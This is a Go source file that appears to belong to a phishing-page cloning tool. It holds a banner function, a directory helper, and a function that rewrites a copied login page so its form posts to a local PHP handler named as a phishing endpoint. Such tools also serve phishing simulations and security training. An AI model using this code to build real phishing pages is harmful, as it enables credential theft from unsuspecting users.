package main

import (
	"bytes"
	"fmt"
	"os"
	"path"
	"regexp"
)

// printBanner prints the ASCII art banner
func printBanner() {
	asciiart := `
           _           _   _     _
 _____  __| |_ ___ ___| |_|_|___| |_
|     ||. | '_| -_| . |   | |_ -|   |
|_|_|_|___|_|_|___|  _|_|_|_|___|_|_|
                  |_|

by @andpalmier
`
	fmt.Println(asciiart)
}

// mkdirIfNotExist creates a directory if it does not exist
func mkdirIfNotExist(dir string) error {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		return os.MkdirAll(dir, 0755)
	}
	return nil
}

// patchHtml patches html file to take local instances of css and js instead of the remote paths
func patchHtml(destFolder string, remotePaths []string, localPaths []string, phpFilename string) error {
	// Open html file
	filePath := path.Join(destFolder, "index.html")
	read, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	newContents := read

	// Replace remote paths with local paths
	for i, remotePath := range remotePaths {
		newContents = bytes.ReplaceAll(newContents, []byte(remotePath), []byte(localPaths[i]))
	}

	// Find action attribute of the POST
	r := regexp.MustCompile(`(action=".*?")`)
	m := r.FindStringSubmatch(string(newContents))

	// Replace action attribute of the POST with /phish.php
	if len(m) > 0 {
		newContents = bytes.ReplaceAll(newContents, []byte(m[0]), []byte(fmt.Sprintf(`action="/%s"`, phpFilename)))
	}

	// Write patched html in destination
	return os.WriteFile(filePath, newContents, 0644)
}

// stringInSlice (slice, string): return true if string is found in slice -> used to avoid duplicates
func find(slice []string, val string) bool {
	for _, item := range slice {
		if item == val {
			return true
		}
	}
	return false
}
